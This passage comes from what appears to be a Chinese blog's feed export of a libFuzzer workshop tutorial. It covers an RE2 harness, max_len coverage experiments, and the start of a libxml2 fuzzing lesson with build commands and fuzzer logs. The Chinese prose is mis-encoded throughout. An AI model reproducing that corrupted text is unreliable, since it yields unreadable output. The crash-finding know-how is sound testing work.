class="line"><span class="params">          <span class="type">const</span> RE2::Options&amp; options)</span> &#123;</span><br><span class="line">  RE2 <span class="title function_">re</span><span class="params">(pattern, options)</span>;</span><br><span class="line">  <span class="keyword">if</span> (!re.ok())</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">string</span> m1, m2;</span><br><span class="line">  <span class="type">int</span> i1, i2;</span><br><span class="line">  <span class="type">double</span> d1;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (re.NumberOfCapturingGroups() == <span class="number">0</span>) &#123;</span><br><span class="line">    RE2::FullMatch(buffer, re);</span><br><span class="line">    RE2::PartialMatch(buffer, re);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (re.NumberOfCapturingGroups() == <span class="number">1</span>) &#123;</span><br><span class="line">    RE2::FullMatch(buffer, re, &amp;m1);</span><br><span class="line">    RE2::PartialMatch(buffer, re, &amp;i1);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (re.NumberOfCapturingGroups() == <span class="number">2</span>) &#123;</span><br><span class="line">    RE2::FullMatch(buffer, re, &amp;i1, &amp;i2);</span><br><span class="line">    RE2::PartialMatch(buffer, re, &amp;m1, &amp;m2);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  re2::StringPiece <span class="title function_">input</span><span class="params">(buffer)</span>;</span><br><span class="line">  RE2::Consume(&amp;input, re, &amp;m1);</span><br><span class="line">  RE2::FindAndConsume(&amp;input, re, &amp;d1);</span><br><span class="line">  <span class="built_in">string</span> <span class="title function_">tmp1</span><span class="params">(buffer)</span>;</span><br><span class="line">  RE2::Replace(&amp;tmp1, re, <span class="string">&quot;zz&quot;</span>);</span><br><span class="line">  <span class="built_in">string</span> <span class="title function_">tmp2</span><span class="params">(buffer)</span>;</span><br><span class="line">  RE2::GlobalReplace(&amp;tmp2, re, <span class="string">&quot;xx&quot;</span>);</span><br><span class="line">  RE2::QuoteMeta(re2::StringPiece(pattern));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Entry point for LibFuzzer.</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (size &lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  RE2::Options options;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> options_randomizer = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">    options_randomizer += data[i];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (options_randomizer &amp; <span class="number">1</span>)</span><br><span class="line">    options.set_encoding(RE2::Options::EncodingLatin1);</span><br><span class="line"></span><br><span class="line">  options.set_posix_syntax(options_randomizer &amp; <span class="number">2</span>);</span><br><span class="line">  options.set_longest_match(options_randomizer &amp; <span class="number">4</span>);</span><br><span class="line">  options.set_literal(options_randomizer &amp; <span class="number">8</span>);</span><br><span class="line">  options.set_never_nl(options_randomizer &amp; <span class="number">16</span>);</span><br><span class="line">  options.set_dot_nl(options_randomizer &amp; <span class="number">32</span>);</span><br><span class="line">  options.set_never_capture(options_randomizer &amp; <span class="number">64</span>);</span><br><span class="line">  options.set_case_sensitive(options_randomizer &amp; <span class="number">128</span>);</span><br><span class="line">  options.set_perl_classes(options_randomizer &amp; <span class="number">256</span>);</span><br><span class="line">  options.set_word_boundary(options_randomizer &amp; <span class="number">512</span>);</span><br><span class="line">  options.set_one_line(options_randomizer &amp; <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">  options.set_log_errors(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* data_input = reinterpret_cast&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">pattern</span><span class="params">(data_input, size)</span>;</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">buffer</span><span class="params">(data_input, size)</span>;</span><br><span class="line">    Test(buffer, pattern, options);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">pattern</span><span class="params">(data_input, size / <span class="number">3</span>)</span>;</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">buffer</span><span class="params">(data_input + size / <span class="number">3</span>, size - size / <span class="number">3</span>)</span>;</span><br><span class="line">    Test(buffer, pattern, options);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°harnessç”¨åˆ°äº†å¾ˆå¤šre2é‡Œçš„æ–¹æ³•ï¼Œæœ€åä½¿ç”¨FullMatchå’ŒPartialMatchæ¥å£è¿›è¡ŒåŒ¹é…bufferå’Œreã€‚å…¶ä¸­bufferæ˜¯ç”±<code>data_input</code>å’Œ<code>size</code>åˆå§‹åŒ–å¾—åˆ°ï¼ˆdata_inputç”±è¾“å…¥çš„dataç»æ— å…³ç±»å‹è½¬æ¢å¾—åˆ°ï¼‰ï¼Œreæ˜¯ç”±patternå’Œoptionså»ºç«‹çš„RE2å¯¹è±¡ã€‚<br>æ³¨æ„åˆ°harnessé‡Œæœ‰å‡ ä¸ªæ¡ä»¶åˆ†æ”¯è¯­å¥ï¼Œé¦–å…ˆæ˜¯size&lt;1æ˜¯ç›´æ¥è¿”å›ï¼Œè¿˜æœ‰å°±æ˜¯å½“size&gt;&#x3D;3æ—¶ï¼Œåˆå§‹åŒ–pattnå’Œbufferç”¨çš„æ˜¯size&#x2F;3å’Œsize-size&#x2F;3è¯´æ˜å®ƒå¯¹æˆ‘ä»¬çš„è¾“å…¥çš„sizeè¿›è¡Œäº†åˆ‡å‰²ï¼Œåˆå§‹åŒ–patternç”¨åˆ°çš„æ˜¯<code>data_input + size / 3</code>ï¼Œè€Œåˆå§‹åŒ–bufferæ˜¯ç”¨çš„ä¹‹åçš„data_inputã€‚è¿™æ ·ä½¿å¾—æˆ‘ä»¬æ ·ä¾‹çš„sizeä¼šå¯¹fuzzçš„è¿‡ç¨‹äº§ç”Ÿå½±å“ã€‚å¦‚æœsizeå¾ˆçŸ­ï¼Œå¯èƒ½æ— æ³•è§¦å‘crashï¼Œè€Œå¦‚æœsizeå¾ˆå¤§ï¼Œå¯¹harnessçš„æ‰§è¡ŒåŒ¹é…è¿‡ç¨‹å°±ä¼šæ›´åŠ è€—æ—¶ï¼Œå½±å“fuzzå¯»æ‰¾è¦†ç›–ç‚¹çš„æ•ˆç‡ã€‚ä¸‹é¢åšå‡ ä¸ªæµ‹è¯•ï¼Œæ¯”è¾ƒä¸€ä¸‹max_lenå¯¹fuzzè¿‡ç¨‹çš„å½±å“ï¼š<br>ç¼–è¯‘é“¾æ¥harnessï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope -std=gnu++98 target.cc -I re2/ re2/obj/libre2.a -fsanitize=fuzzer -o re2_fuzzer</span><br></pre></td></tr></table></figure><p>ç”±äºä½¿ç”¨çš„re2ç‰ˆæœ¬è¾ƒè€äº†ï¼Œç¼–è¯‘çš„æ—¶å€™ä½¿ç”¨äº†c++98æ ‡å‡†ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬è®¾ç½®max_lenä¸º10ï¼Œæ‰§è¡Œæ—¶é—´ä¸º100ç§’,-print_final_stats&#x3D;1æ‰“å°æœ€åçš„ç»“æœï¼Œcorpus1ä½œä¸ºè¯­æ–™åº“çš„å­˜æ”¾å¤„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">âœ  10 git:(master) âœ— ./re2_fuzzer ./corpus1 -print_final_stats=1 -max_len=10 -max_total_time=100</span><br><span class="line"></span><br><span class="line">Done 643760 runs in 101 second(s)</span><br><span class="line">stat::number_of_executed_units: 643760</span><br><span class="line">stat::average_exec_per_sec:     6373</span><br><span class="line">stat::new_units_added:          36</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              456</span><br></pre></td></tr></table></figure><p>åªæ¢æµ‹åˆ°äº†36ä¸ªä»£ç å•å…ƒã€‚<br>æ¥ç€è®¾ç½®max_lenä¸º100ï¼Œæ‰§è¡Œæ—¶é—´ä¸º100ç§’,-print_final_stats&#x3D;1æ‰“å°æœ€åçš„ç»“æœï¼Œcorpus2ä½œä¸ºè¯­æ–™åº“çš„å­˜æ”¾å¤„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./re2_fuzzer ./corpus2 -print_final_stats=1 -max_len=100 -max_total_time=100</span><br><span class="line">Done 233437 runs in 101 second(s)</span><br><span class="line"></span><br><span class="line">stat::number_of_executed_units: 233437</span><br><span class="line">stat::average_exec_per_sec:     2311</span><br><span class="line">stat::new_units_added:          50</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              675</span><br></pre></td></tr></table></figure><p>æ¢æµ‹åˆ°äº†50ä¸ªä»£ç å•å…ƒ,æ„Ÿè§‰å·®åˆ«ä¸å¤§ã€‚<br>ç„¶å¹´è®¾ç½®max_lenä¸º1000ï¼Œæ‰§è¡Œæ—¶é—´ä¸º100ç§’,-print_final_stats&#x3D;1æ‰“å°æœ€åçš„ç»“æœï¼Œcorpus3ä½œä¸ºè¯­æ–™åº“çš„å­˜æ”¾å¤„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./re2_fuzzer ./corpus3 -print_final_stats=1 -max_len=1000 -max_total_time=100</span><br><span class="line"></span><br><span class="line">Done 105935 runs in 101 second(s)</span><br><span class="line">stat::number_of_executed_units: 105935</span><br><span class="line">stat::average_exec_per_sec:     1048</span><br><span class="line">stat::new_units_added:          97</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              830</span><br></pre></td></tr></table></figure><p>è¿™æ¬¡æ¢æµ‹åˆ°äº†97ä¸ªä»£ç å•å…ƒï¼Œæ˜¯ç¬¬äºŒä¸ªçš„2å€ï¼Œç¬¬ä¸€ä¸ªçš„3å€å·¦å³ã€‚<br>æœ€åå†è®¾ç½®max_lenä¸º500ï¼Œæ‰§è¡Œæ—¶é—´ä¸º100ç§’,-print_final_stats&#x3D;1æ‰“å°æœ€åçš„ç»“æœï¼Œcorpus4ä½œä¸ºè¯­æ–™åº“çš„å­˜æ”¾å¤„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./re2_fuzzer ./corpus4 -print_final_stats=1 -max_len=500 -max_total_time=100</span><br><span class="line"></span><br><span class="line">Done 119361 runs in 101 second(s)</span><br><span class="line">stat::number_of_executed_units: 119361</span><br><span class="line">stat::average_exec_per_sec:     1181</span><br><span class="line">stat::new_units_added:          117</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              827</span><br></pre></td></tr></table></figure><p>ç»“æœä¹Ÿæ¯”è¾ƒæ˜æ˜¾ï¼Œä¸åŒçš„max_lenå¯¹fuzzçš„æ•ˆç‡æœ‰ç€ä¸åŒçš„å½±å“ï¼Œå½“ç„¶è¿™ä¹Ÿå’Œä½ å†™çš„harnessæœ‰å…³ã€‚å› æ­¤åœ¨æ‰§è¡Œfuzzerçš„æ—¶å€™é€‰æ‹©åˆé€‚çš„max_len(å¦‚æœ¬ä¾‹ä¸­çš„max_lenåœ¨100~1000æ¯”è¾ƒåˆé€‚)ä¼šä½¿å¾—æˆ‘ä»¬fuzzeræ¢æµ‹åˆ°æ›´å¤šçš„ä»£ç å—ï¼Œå¾—åˆ°crashçš„æ•ˆç‡ä¹Ÿå°±è¶Šå¤§ã€‚</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>libfuzzer workshopåˆ°æ­¤å°±å…¨éƒ¨å­¦ä¹ å®Œäº†ã€‚libfuzzerä½œä¸ºæœ€å¸¸ç”¨çš„fuzzå·¥å…·ï¼Œå®ƒæ‰€æ¶‰åŠåˆ°çš„ä¸€äº›ä½¿ç”¨æ–¹æ³•åœ¨workshopé‡Œéƒ½æœ‰ç›¸åº”çš„lessonã€‚å°±æˆ‘ä¸ªäººè€Œè¨€ï¼Œåœ¨é€æ­¥å­¦ä¹ libfuzzerçš„è¿‡ç¨‹ä¸­æ„Ÿè§‰åˆ°libfuzzerå¯¹äºå¼€æºåº“æä¾›çš„æ¥å£å‡½æ•°çš„fuzzæ˜¯ååˆ†å¼ºåŠ›çš„ï¼Œè€Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬åœ¨å­¦ä¹ libfuzzerä¸­çš„éš¾ç‚¹:å¦‚ä½•èƒ½å¤Ÿè®¾è®¡å‡ºåˆç†çš„harnessï¼Œè¿™éœ€è¦æˆ‘ä»¬å¯¹è¦fuzzçš„å¼€æºåº“æä¾›çš„æ–¹æ³•æœ‰ä¸€å®šçš„äº†è§£ï¼Œç»è¿‡æ”»å‡»é¢åˆ†æç­‰å»é€æ­¥æ”¹å–„æˆ‘ä»¬çš„harnessï¼Œä½¿å¾—æˆ‘ä»¬ä¸è·å¾—crashæ›´è¿‘ä¸€æ­¥ã€‚</p><p>åˆå­¦libfuzzerï¼Œæœ‰é”™è¯¯ç–å¿½ä¹‹å¤„çƒ¦è¯·å„ä½å¸ˆå‚…æŒ‡æ­£ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> FUZZ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ï¼ˆè½¬ï¼‰LibFuzzer workshopå­¦ä¹ ä¹‹è·¯ï¼ˆäºŒï¼‰</title>
      <link href="/2020/12/22/libfuzzer(2)/"/>
      <url>/2020/12/22/libfuzzer(2)/</url>
      
        <content type="html"><![CDATA[<p>æ–‡ç« é¦–å‘äºå®‰å…¨å®¢ï¼Œç”±å®‰å…¨å®¢åŸåˆ›å‘å¸ƒï¼š <a href="https://www.anquanke.com/post/id/225957">https://www.anquanke.com/post/id/225957</a></p><h3 id="LibFuzzer-workshopå­¦ä¹ ä¹‹è·¯ï¼ˆäºŒï¼‰"><a href="#LibFuzzer-workshopå­¦ä¹ ä¹‹è·¯ï¼ˆäºŒï¼‰" class="headerlink" title="LibFuzzer workshopå­¦ä¹ ä¹‹è·¯ï¼ˆäºŒï¼‰"></a>LibFuzzer workshopå­¦ä¹ ä¹‹è·¯ï¼ˆäºŒï¼‰</h3><blockquote><p>ä¸Šä¸€ç¯‡å¯¹libfuzzerçš„åŸç†å’Œä½¿ç”¨æœ‰äº†åŸºæœ¬çš„äº†è§£ï¼Œæ¥ä¸‹æ¥å°±åˆ°è¿›é˜¶çš„å†…å®¹äº†ï¼Œä¼šæ¶‰åŠåˆ°å­—å…¸çš„ä½¿ç”¨ï¼Œè¯­æ–™åº“ç²¾ç®€ï¼Œé”™è¯¯æŠ¥å‘Šç”Ÿæˆä»¥åŠä¸€äº›å…³é”®çš„ç¼–è¯‘é€‰é¡¹çš„é€‰æ‹©ç­‰å†…å®¹ï¼Œå¸Œæœ›èƒ½å¯¹libfuzzeræœ‰æ›´æ·±å…¥çš„å­¦ä¹ ã€‚</p></blockquote><span id="more"></span><h4 id="lesson-08-dictionaries-are-so-effective"><a href="#lesson-08-dictionaries-are-so-effective" class="headerlink" title="lesson 08(dictionaries are so effective)"></a>lesson 08(dictionaries are so effective)</h4><p>å¯¹libxml2è¿›è¡Œfuzzã€‚<br>é¦–å…ˆå¯¹å…¶è§£å‹å¹¶ç”¨clangç¼–è¯‘ä¹‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tar xzf libxml2.tgz</span><br><span class="line">cd libxml2</span><br><span class="line"></span><br><span class="line">./autogen.sh</span><br><span class="line">export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link&quot;</span><br><span class="line">CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \</span><br><span class="line">    CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot;  ./configure</span><br><span class="line">make -j$(nproc)</span><br></pre></td></tr></table></figure><p>è§£é‡Šä¸‹æ–°çš„ç¼–è¯‘é€‰é¡¹<br><code>-gline-tables-only</code>:è¡¨ç¤ºä½¿ç”¨é‡‡æ ·åˆ†æå™¨<br>clangæ‰‹å†Œä¸­å¯¹é‡‡æ ·åˆ†æå™¨çš„è§£é‡Š:<code>Sampling profilers are used to collect runtime information, such as hardware counters, while your application executes. They are typically very efficient and do not incur a large runtime overhead. The sample data collected by the profiler can be used during compilation to determine what the most executed areas of the code are.</code><br>ç”¨äºæ”¶é›†ç¨‹åºæ‰§è¡ŒæœŸé—´çš„ä¿¡æ¯æ¯”å¦‚ç¡¬ä»¶è®¡æ•°å™¨ï¼Œåœ¨ç¼–è¯‘æœŸé—´ä½¿ç”¨é‡‡æ ·åˆ†æå™¨æ‰€æ”¶é›†çš„æ•°æ®æ¥ç¡®å®šä»£ç ä¸­æœ€å€¼å¾—æ‰§è¡Œçš„åŒºåŸŸã€‚å› æ­¤ï¼Œä½¿ç”¨æ ·æœ¬åˆ†æå™¨ä¸­çš„æ•°æ®éœ€è¦å¯¹ç¨‹åºçš„æ„å»ºæ–¹å¼è¿›è¡Œä¸€äº›æ›´æ”¹ã€‚åœ¨ç¼–è¯‘å™¨å¯ä»¥ä½¿ç”¨åˆ†æä¿¡æ¯ä¹‹å‰ï¼Œä»£ç éœ€è¦åœ¨åˆ†æå™¨ä¸‹æ‰§è¡Œã€‚è¿™ä¹Ÿå¯¹æé«˜æˆ‘ä»¬fuzzæ•ˆç‡å¾ˆé‡è¦ã€‚<br>æä¾›çš„harnessï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2015 The Chromium Authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libxml/parser.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ignore</span> <span class="params">(<span class="type">void</span>* ctx, <span class="type">const</span> <span class="type">char</span>* msg, ...)</span> &#123;</span><br><span class="line">  <span class="comment">// Error handler to avoid spam of error messages from libxml parser.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  xmlSetGenericErrorFunc(<span class="literal">NULL</span>, &amp;ignore);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">auto</span> doc = xmlReadMemory(reinterpret_cast&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data),</span><br><span class="line">                               static_cast&lt;<span class="type">int</span>&gt;(size), <span class="string">&quot;noname.xml&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    xmlFreeDoc(doc);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†è¾“å…¥çš„æ ·æœ¬ç±»å‹è½¬æ¢åäº¤ç»™<code>xmlReadMemory</code>å¤„ç†ã€‚ç¼–è¯‘å¦‚ä¸‹ï¼š<br><code>clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -std=c++11 xml_read_memory_fuzzer.cc -I libxml2/include libxml2/.libs/libxml2.a -fsanitize=fuzzer -lz -o libxml2-v2.9.2-fsanitize_fuzzer1</code></p><p>ç”±äºç¼–è¯‘æ—¶ä½¿ç”¨äº†æ ·æœ¬åˆ†æå™¨ï¼Œfuzzçš„æ‰§è¡Œé€Ÿç‡å’Œè¦†ç›–ç‡éƒ½å¾ˆå¯è§‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">2481433</span>NEW    cov: <span class="number">2018</span> ft: <span class="number">9895</span> corp: <span class="number">3523</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2038</span> rss: <span class="number">553</span>Mb L: <span class="number">484</span>/<span class="number">1470</span> MS: <span class="number">1</span> CopyPart-</span><br><span class="line">#<span class="number">2481939</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9895</span> corp: <span class="number">3523</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">390</span>/<span class="number">1470</span> MS: <span class="number">4</span> InsertByte-ChangeBit-ShuffleBytes-EraseBytes-</span><br><span class="line">#<span class="number">2482177</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9895</span> corp: <span class="number">3523</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">816</span>/<span class="number">1470</span> MS: <span class="number">3</span> ChangeBit-ShuffleBytes-EraseBytes-</span><br><span class="line">#<span class="number">2482341</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9895</span> corp: <span class="number">3523</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2038</span> rss: <span class="number">553</span>Mb L: <span class="number">41</span>/<span class="number">1470</span> MS: <span class="number">2</span> CopyPart-EraseBytes-</span><br><span class="line">#<span class="number">2482513</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2038</span> rss: <span class="number">553</span>Mb L: <span class="number">604</span>/<span class="number">1470</span> MS: <span class="number">3</span> ChangeASCIIInt-ChangeASCIIInt-CopyPart-</span><br><span class="line">#<span class="number">2482756</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2038</span> rss: <span class="number">553</span>Mb L: <span class="number">342</span>/<span class="number">1470</span> MS: <span class="number">2</span> InsertRepeatedBytes-EraseBytes-</span><br><span class="line">#<span class="number">2483073</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2038</span> rss: <span class="number">553</span>Mb L: <span class="number">1188</span>/<span class="number">1470</span> MS: <span class="number">3</span> InsertByte-ShuffleBytes-EraseBytes-</span><br><span class="line">#<span class="number">2483808</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">102</span>/<span class="number">1470</span> MS: <span class="number">2</span> InsertRepeatedBytes-EraseBytes-</span><br><span class="line">#<span class="number">2483824</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">477</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2483875</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">70</span>/<span class="number">1470</span> MS: <span class="number">3</span> CopyPart-ChangeByte-EraseBytes-</span><br><span class="line">#<span class="number">2483999</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1470</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">604</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2485065</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">32</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2485100</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">139</span>/<span class="number">1470</span> MS: <span class="number">2</span> ChangeByte-EraseBytes-</span><br><span class="line">#<span class="number">2485127</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2036</span> rss: <span class="number">553</span>Mb L: <span class="number">622</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2485277</span>REDUCE cov: <span class="number">2018</span> ft: <span class="number">9896</span> corp: <span class="number">3524</span>/<span class="number">671</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">93</span>/<span class="number">1470</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">2485465</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9897</span> corp: <span class="number">3525</span>/<span class="number">671</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">40</span>/<span class="number">1470</span> MS: <span class="number">1</span> PersAutoDict- DE: <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x05&quot;</span>-</span><br><span class="line">#<span class="number">2485715</span>NEW    cov: <span class="number">2019</span> ft: <span class="number">9899</span> corp: <span class="number">3526</span>/<span class="number">672</span>Kb lim: <span class="number">1480</span> exec/s: <span class="number">2037</span> rss: <span class="number">553</span>Mb L: <span class="number">1092</span>/<span class="number">1470</span> MS: <span class="number">3</span> ChangeBit-CopyPart-CopyPart-</span><br><span class="line">#<span class="number">2485805</span>REDUCE cov: <span class="number">2019</span> ft: <span class="number">9899</span> corp: <span 